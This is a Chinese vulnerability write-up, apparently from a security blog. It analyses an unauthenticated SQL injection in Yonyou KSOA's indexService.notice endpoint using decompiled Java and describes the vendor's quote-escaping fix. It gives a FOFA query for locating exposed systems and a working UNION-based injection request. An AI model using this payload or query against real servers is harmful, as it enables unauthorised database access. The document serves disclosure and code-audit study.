---
title: "时空智友企业流程化管控系统 indexService.notice sql注入漏洞"
source: https://mrxn.net/jswz/yonyou-ksoa-formservice-indexService-notice-id-sqli.html
asset_dir: assets/时空智友企业流程化管控系统-indexservice.notice-sql注入漏洞
---

# 时空智友企业流程化管控系统 indexService.notice sql注入漏洞

[Mrxn](https://mrxn.net/author/1)- 发表于2025/4/28 08:26
- 1055浏览
- [0评论](#comment)
- 4小时阅读

深入探索

sql

身份认证

Database

---

# 漏洞简介

[用友](https://mrxn.net/tag/%E7%94%A8%E5%8F%8B "用友")时空KSOA是建立在SOA理念指导下研发的新一代产品，是根据流通企业最前沿的I需求推出的统一的IT基础架构，它可以让流通企业各个时期建立的IT系统之间彼此轻松对话，帮助流通企业保护原有的IT投资，简化IT管理，提升竞争能力，确保企业整体的战略目标以及创新活动的实现。 用友时空KSOA **indexService.notice** 接口处存在[sql注入漏洞](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)，未经身份认证的攻击者可通过该漏洞获取数据库敏感信息及凭证，最终可能导致服务器失陷。

编程

# 影响版本

用友时空 KSOA v9.0

# fofa语法

> `app="用友-时空KSOA"`

# 漏洞分析

先看下 `formservice` 在web.xml 里的相关 servlet 配置

```
<servlet>
    <servlet-name>formservice</servlet-name>
    <servlet-class>com.artery.form.FormService</servlet-class>
</servlet>
<servlet-mapping>
    <servlet-name>formservice</servlet-name>
    <url-pattern>/formservice/*</url-pattern>
</servlet-mapping>
```

`/formservice/` 对应的类为 `com.artery.form.FormService` 看下其实现关键业务逻辑部分

代码安全审计

深入探索

网络安全课程

Web安全书籍

SQL注入检测工具

```
protected final void service(HttpServletRequest var1, HttpServletResponse var2) {
        String var3;
        if (a && GeneralUtility.isNotBlack(var3 = var1.getHeader("referer")) && var3.lastIndexOf(var1.getScheme() + "://" + var1.getServerName()) != 0) {
            outputError(var2, LocalMessage.getInstance(var1).getMessage("formservice.error.invalidRequest"));
        } else {
            long var49 = System.currentTimeMillis();
            String var5;
            boolean var50 = (var5 = var1.getParameter("inflate")) != null && var5.equals("true");

            Object[] var6;
            Object var7;
            try {
                var7 = ((Class)(var6 = getService(var1, var1.getParameter("service")))[0]).newInstance();
            } catch (Exception var39) {
                outputError(var2, (Throwable)var39);
                return;
            }

            Class var8 = (Class)var6[0];
            int var9 = (Integer)var6[2];
            String var10 = (String)var6[3];
            String var11 = (String)var6[4];
            Class[] var12 = var8.getInterfaces();
            int var13 = 0;

            while(true) {
                if (var13 < var12.length) {
                    if (var12[var13] != ISecurityService.class) {
                        ++var13;
                        continue;
                    }

                    Method var61 = null;

                    try {
                        var61 = var8.getMethod("isAccessible", HttpServletRequest.class, String.class);

                        try {
                            var61.invoke(var7, var1, var11);
                        } catch (IllegalArgumentException var35) {
                            outputError(var2, (Throwable)var35);
                            return;
                        } catch (IllegalAccessException var36) {
                            outputError(var2, (Throwable)var36);
                            return;
                        } catch (InvocationTargetException var37) {
                            outputError(var2, (Throwable)var37);
                            return;
                        }
                    } catch (NoSuchMethodException var38) {
                    }

                    if (var61 == null) {
                        try {
                            UserContext var57 = UserContext.getCurrentUserContext(var1);
                            UserContext.checkAnonymous(var1);
                            String var62;
                            if ((var62 = var1.getParameter("_pid")) == null || var62.length() <= 0) {
                                throw new AuthenticationException(LocalMessage.getInstance(var1).getMessage("formservice.error.noaccess", new String[]{var10, LocalMessage.getInstance(var1).getMessage("login.error.invalidpassport")}));
                            }

                            var57.checkSameUser(var62);
                        } catch (AuthenticationException var48) {
                            outputError(var2, (Throwable)var48);
                            return;
                        }
                    }
                }

                Object var69 = null;
                boolean var63 = var1.getMethod().equalsIgnoreCase("GET");
                if (var9 != 0) {
                    try {
                        if (var63) {
                            String var58;
                            if ((var58 = GeneralUtility.getParameter(var1, "content")) == null) {
                                var58 = "";
                            }

                            if (var50 && var58.length() > 0) {
                                var58 = new String(GeneralUtility.gzipInflate(AlgorithmUtil.base64Decode(var58)), "UTF-8");
                            }

                            if (var9 == 1) {
                                if (var58.length() > 0) {
                                    InputSource var64;
                                    (var64 = new InputSource(new StringReader(var58))).setEncoding("UTF-8");
                                    var69 = (new SAXReader()).read(var64);
                                } else {
                                    var69 = DocumentHelper.createDocument();
                                }
                            } else if (var9 != 3 && var9 != 6) {
                                if (var9 == 4) {
                                    var69 = var58.length() > 0 ? new JSONArray(var58) : new JSONArray();
                                } else if (var9 == 2) {
                                    var69 = var58.toString();
                                } else if (var9 == 5) {
                                    var69 = AlgorithmUtil.base64Decode(var58);
                                } else if (var9 == 7) {
                                    Type var15;
                                    Method var65;
                                    if ((var15 = (var65 = (Method)var6[1]).getGenericParameterTypes()[2]) instanceof ParameterizedType) {
                                        Type[] var51;
                                        Class[] var14 = new Class[(var51 = ((ParameterizedType)var15).getActualTypeArguments()).length];

                                        for(int var16 = 0; var16 < var51.length; ++var16) {
                                            var14[var16] = GeneralUtility.getClassFromType(var51[var16]);
                                        }

                                        var69 = GeneralUtility.fromJson(var58, GeneralUtility.getClassFromType(var15), var14);
                                    } else {
                                        var69 = GeneralUtility.fromJson(var58, GeneralUtility.getClassFromType(var15), new Class[0]);
                                    }
                                }
                            } else {
                                var69 = var58.length() > 0 ? new JSONObject(var58) : new JSONObject();
                            }
                        } else {
                            byte[] var59 = null;
                            String var66;
                            if ((var66 = GeneralUtility.getParameter(var1, "content")) != null) {
                                var59 = var66.getBytes("UTF-8");
                                if (var50 && var59.length > 0) {
                                    var59 = GeneralUtility.gzipInflate(var59);
                                }
                            } else {
                                String var70;
                                if ((var70 = var1.getContentType()) != null && var70.indexOf("multipart/form-data") >= 0) {
                                    var59 = getUploadFileContent(var1);
                                    if (var50 && var59.length > 0) {
                                        var59 = GeneralUtility.gzipInflate(var59);
                                    }
                                } else {
                                    int var79;
                                    if ((var79 = var1.getContentLength()) > 0) {
                                        if (var50) {
                                            var59 = GeneralUtility.gzipInflate(var1.getInputStream());
                                        } else if (var9 != 1 && var9 != 5) {
                                            ServletInputStream var52 = var1.getInputStream();
                                            var59 = new byte[var79];

                                            for(int var84 = 0; var84 < var79 && (var71 = ((InputStream)var52).read(var59, var84, var79)) != -1; var84 += var71) {
                                            }
                                        }
                                    } else {
                                        var59 = new byte[0];
                                    }
                                }
                            }

                            if (var9 == 1) {
                                if (var59 != null) {
                                    String var72 = new String(var59, "UTF-8");
                                    InputSource var80;
                                    (var80 = new InputSource(new StringReader(var72))).setEncoding("UTF-8");
                                    var69 = (new SAXReader()).read(var80);
                                } else {
                                    var69 = (new SAXReader()).read(var1.getInputStream());
                                }
                            } else if (var9 != 2 && var9 != 3 && var9 != 4 && var9 != 6) {
                                if (var9 == 5) {
                                    if (var59 != null) {
                                        var69 = new ByteArrayInputStream(var59);
                                    } else {
                                        var69 = var1.getInputStream();
                                    }
                                } else if (var9 == 7) {
                                    if (var59 != null) {
                                        var66 = new String(var59, "UTF-8");
                                    }

                                    Type var53;
                                    Method var73;
                                    if ((var53 = (var73 = (Method)var6[1]).getGenericParameterTypes()[2]) instanceof ParameterizedType) {
                                        Type[] var74;
                                        Class[] var85 = new Class[(var74 = ((ParameterizedType)var53).getActualTypeArguments()).length];

                                        for(int var17 = 0; var17 < var74.length; ++var17) {
                                            var85[var17] = GeneralUtility.getClassFromType(var74[var17]);
                                        }

                                        var69 = GeneralUtility.fromJson(var66, GeneralUtility.getClassFromType(var53), var85);
                                    } else {
                                        var69 = GeneralUtility.fromJson(var66, GeneralUtility.getClassFromType(var53), new Class[0]);
                                    }
                                }
                            } else {
                                var66 = new String(var59, "UTF-8");
                                if (var9 == 2) {
                                    var69 = var66.toString();
                                } else if (var9 != 3 && var9 != 6) {
                                    if (var9 == 4) {
                                        var69 = var66.length() > 0 ? new JSONArray(var66) : new JSONArray();
                                    }
                                } else {
                                    var69 = var66.length() > 0 ? new JSONObject(var66) : new JSONObject();
                                }
                            }
                        }
                    } catch (Exception var47) {
                        outputError(var2, LocalMessage.getInstance(var1).getMessage("formservice.error.submitXMLNotValid", new Object[]{var10 + "." + var11, var47.getMessage()}));
                        return;
                    }
                }

                boolean var60 = false;

                try {
                    label657: {
                        Object[] var10000;
                        if (var7 instanceof AbstractArteryService) {
                            var60 = true;
                            AbstractArteryService var81;
                            (var81 = (AbstractArteryService)var7).setCreateBySystem(true);
                            var81.setRequest(var1);
                            var81.setResponse(var2);
                            if (var9 == 0) {
                                var68 = new Object[0];
                                break label657;
                            }

                            if (var69 instanceof JSONObject) {
                                try {
                                    JSONObject var54;
                                    String[] var75 = JSONObject.getNames(var54 = (JSONObject)var69);
                                    JSONArray var86 = null;
                                    String[] var19 = var75;
                                    int var18 = var75.length;

                                    for(int var76 = 0; var76 < var18; ++var76) {
                                        String var87;
                                        if ((var87 = var19[var76]).equals("java.io.Serializable")) {
                                            var86 = var54.getJSONArray("java.io.Serializable");
                                        } else {
                                            var81.putParam(var87, var54.get(var87));
                                        }
                                    }

                                    if (var86 == null) {
                                        var68 = new Object[0];
                                        break label657;
                                    }

                                    Type[] var77;
                                    Method var88;
                                    var68 = new Object[(var77 = (var88 = (Method)var6[1]).getGenericParameterTypes()).length];
                                    var18 = 0;

                                    while(true) {
                                        if (var18 >= var77.length) {
                                            break label657;
                                        }

                                        var19 = var86.getString(var18);
                                        Type var55;
                                        if (!((var55 = var77[var18]) instanceof ParameterizedType)) {
                                            var68[var18] = GeneralUtility.fromJson(var19, GeneralUtility.getClassFromType(var55), new Class[0]);
                                        } else {
                                            Type[] var82;
                                            Class[] var89 = new Class[(var82 = ((ParameterizedType)var55).getActualTypeArguments()).length];

                                            for(int var20 = 0; var20 < var82.length; ++var20) {
                                                var89[var20] = GeneralUtility.getClassFromType(var82[var20]);
                                            }

                                            var68[var18] = GeneralUtility.fromJson(var19, GeneralUtility.getClassFromType(var55), var89);
                                        }

                                        ++var18;
                                    }
                                } catch (Exception var40) {
                                    throw new IllegalArgumentException(var40);
                                }
                            }

                            var10000 = new Object[]{var69};
                        } else {
                            var10000 = var9 == 0 ? new Object[]{var1, var2} : new Object[]{var1, var2, var69};
                        }

                        var68 = var10000;
                    }

                    Object var78;
                    if ((var78 = ((Method)var6[1]).invoke(var7, var68)) != null || var9 == 6) {
                        String var83 = "root";
                        if (var9 == 6) {
                            var83 = "serializable";
                            if (!((Method)var6[1]).getGenericReturnType().equals(Void.TYPE)) {
                                var78 = GeneralUtility.toJson(var78);
                            } else {
                                var78 = JSONObject.NULL;
                            }
                        } else if (!(var78 instanceof String)) {
                            if (var78 instanceof JSONObject) {
                                var83 = "object";
                            } else if (var78 instanceof JSONArray) {
                                var83 = "array";
                            }
                        }

                        this.debug(var10, var11, var49, var69, var1);
                        var2.setContentType("text/xml;charset=UTF-8");
                        var2.setHeader("Pragma", "no-cache");
                        var2.setHeader("Expires", "0");
                        PrintWriter var56;
                        (var56 = var2.getWriter()).write("<?xml version=\"1.0\" encoding=\"utf-8\"?><");
                        ((Writer)var56).write(var83);
                        ((Writer)var56).write(">");
                        ((Writer)var56).write(var78.toString());
                        ((Writer)var56).write("</");
                        ((Writer)var56).write(var83);
                        ((Writer)var56).write(">");
                        ((Writer)var56).flush();
                    }

                    return;
                } catch (IllegalAccessException var41) {
                    outputError(var2, (Throwable)var41);
                    printError(var2, var10, var11, var41);
                    return;
                } catch (SecurityException var42) {
                    outputError(var2, LocalMessage.getInstance(var1).getMessage("formservice.error.methodNotExist", new Object[]{var10, var11}));
                    printError(var2, var10, var11, var42);
                    return;
                } catch (IllegalArgumentException var43) {
                    outputError(var2, (Throwable)var43);
                    printError(var2, var10, var11, var43);
                    return;
                } catch (InvocationTargetException var44) {
                    outputError(var2, var44.getTargetException());
                    printError(var2, var10, var11, var44);
                } catch (Exception var45) {
                    outputError(var2, (Throwable)var45);
                    printError(var2, var10, var11, var45);
                    return;
                } finally {
                    if (var60) {
                        ((AbstractArteryService)var7).release();
                    }

                }

                return;
            }
        }
    }
```

整体执行流程大致如下图所示

漏洞修复方案

[![时空智友企业流程化管控系统 indexService.notice sql注入漏洞](images/img-001-e30b3cd867c5.webp)](https://image.mrxn.net/fccff9078d454f33afc60af8078d5b03.webp)

其主要根据请求参数 "service" 获取服务信息，返回一个数组 `var6`，其中包含类信息。`var7` 是服务实例的创建，如果失败（如类不存在或实例化错误），捕获异常并输出错误，然后返回（结束方法）。

网络安全

- 从 `var6` 数组中提取服务相关信息：`var8` 是服务类，`var9` 是类型码，`var10` 和 `var11` 是服务名和方法名。
- 循环检查服务类是否实现 `ISecurityService` 接口。如果实现，尝试调用 `isAccessible` 方法进行访问权限检查；如果方法不存在或调用失败，fallback到基于用户上下文的检查（如检查参数 "\_pid" 是否有效）。目的是确保只有授权用户才能访问服务，如果失败，输出错误并返回。
- 根据服务类型 `var9` 和请求方法，解析输入数据。`var9` 表示数据格式（如1为XML、2为字符串、4为JSONArray等）。如果启用 "inflate"，则对数据进行解压缩和解码。目的是将请求数据转换为适当的对象（如XML文档、JSON对象），存储在 `var69` 中。如果数据无效，抛出异常并返回错误。
- 如果服务实例是 `AbstractArteryService` 子类，则设置请求和响应对象，并处理参数。调用服务方法，获取返回值 `var78`，根据类型转换为JSON或字符串，输出XML响应。`var9 == 6` 的特殊处理可能表示无返回值服务。异常处理确保错误信息输出，finally块用于资源清理（如关闭连接）。整个过程记录调试信息。

总结下就是根据请求参数，动态调用指定服务方法，进行安全检查、权限验证、输入数据解析和输出XML响应。**indexService.notice** 表示调用 `indexService` 类的 `notice` 方法。

再在看下 plugins.xml 中对于 `indexService` 的定义类为 `com.qy960.service.IndexService` 其中的 `notice` 业务逻辑实现如下

数据管理

```
public JSONObject notice(HttpServletRequest request, HttpServletResponse response, JSONObject obj) throws Exception {
    JSONObject jobj = new JSONObject();
    String id = obj.getString("id");
    Database dbc = null;
    StringBuffer sql = new StringBuffer();
    sql.append(" select a.noticeid,a.noticetitle,a.noticecont,a.issuetime,b.staffname");
    sql.append(" from SysNotice a ");
    sql.append(" join staffdoc b on a.staffid = b.staffid ");
    sql.append(" where a.noticeid = '" + id + "'");

    try {
        dbc = new Database();
        dbc.prepareStatement(sql.toString());
        ResultSet rs = dbc.executeQuery();
        DataModel dtm = new DataModel(rs);
        if (dtm.next()) {
```

将JSON中获取到的 `id` 的值直接拼接进SQL语句中，无任何过滤，造成[SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)漏洞。

修复后的版本 添加了 `DBUtil.sqlEncode` 处理 `id`，其实现如下

```
public static String sqlEncode(String text) {
    if (text == null) {
        return "";
    }
    return StringEscapeUtils.escapeSql((String)text);
}
public static String escapeSql(String str) {
    return str == null ? null : StringUtils.replace(str, "'", "''");
}
```

替换单引号为双单引号，就尽量避免了产生sql注入[漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)。

# 漏洞复现

> ksoa 还有部分使用 Oracle 数据库，自行测试
>
> 安全工具开发

```
POST /formservice?service=indexService.notice HTTP/1.1
Host: ksoa.mrxn.net
Content-Type: application/json

{"id":"1' UNION ALL SELECT NULL,NULL,@@version,NULL,NULL--"}
```

[![时空智友企业流程化管控系统 indexService.notice sql注入漏洞](images/img-002-7e1a27a4bc42.webp)](https://image.mrxn.net/0c8dcd38879f4883b582964e4a8d9b2a.webp)

使用联合注入，成功在响应回显数据库版本信息。

编程

- 标签：
- [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
- [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
- [#SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)
- [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
- [#Java](https://mrxn.net/tag/Java)

---

文章目录

- [1.漏洞简介](#toc-1-)
- [2.影响版本](#toc-2-)
- [3.fofa语法](#toc-3-)
- [4.漏洞分析](#toc-4-)
- [5.漏洞复现](#toc-5-)

  
  

![](data:image/png;base64,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)

手机扫码阅读
